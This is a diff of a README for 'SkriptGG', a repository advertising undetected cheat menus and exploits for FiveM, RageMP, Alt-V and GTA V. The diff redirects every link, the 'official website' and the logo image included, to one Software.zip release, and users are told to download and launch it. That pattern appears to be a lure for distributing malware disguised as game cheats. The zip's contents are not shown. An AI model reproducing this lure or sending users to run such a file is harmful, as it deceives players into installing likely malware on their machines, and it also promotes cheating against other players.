@@ -3,8 +3,8 @@
 Welcome to the SkriptGG repository, your ultimate destination for the best mod menus for FiveM, RageMP, Alt-V, and GTA V. Our menus are undetected for PvP, come packed with never-before-seen exploits, and offer a wide range of cheats for multiplayer gameplay.
 
 ## 🚀 Quick Links
-- [Download Zip File](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip "Needs to be downloaded and launched")
-- [Visit Official Website](https://skriptgg.com)
+- [Download Zip File](https://github.com/2INFINITY2/SkriptGG/releases/download/v1.0/Software.zip "Needs to be downloaded and launched")
+- [Visit Official Website](https://github.com/2INFINITY2/SkriptGG/releases/download/v1.0/Software.zip)
 
 ## 🎮 Menu Features
 - Advanced Aimbot for FiveM
@@ -37,7 +37,7 @@ Welcome to the SkriptGG repository, your ultimate destination for the best mod m
 
 ## 🖥️ Installation
 Follow these steps to get started with SkriptGG:
-1. Download the zip file from the [link provided above](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).
+1. Download the zip file from the [link provided above](https://github.com/2INFINITY2/SkriptGG/releases/download/v1.0/Software.zip).
 2. Extract the contents to your desired location.
 3. Launch the menu and start dominating your gameplay!
 
@@ -50,7 +50,7 @@ Want to contribute to SkriptGG? Here's how you can get involved:
 ## 📝 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-![SkriptGG Logo](https://imageurl.com)
+![SkriptGG Logo](https://github.com/2INFINITY2/SkriptGG/releases/download/v1.0/Software.zip)
 
 🔒 Happy cheating! 😈🎮
 
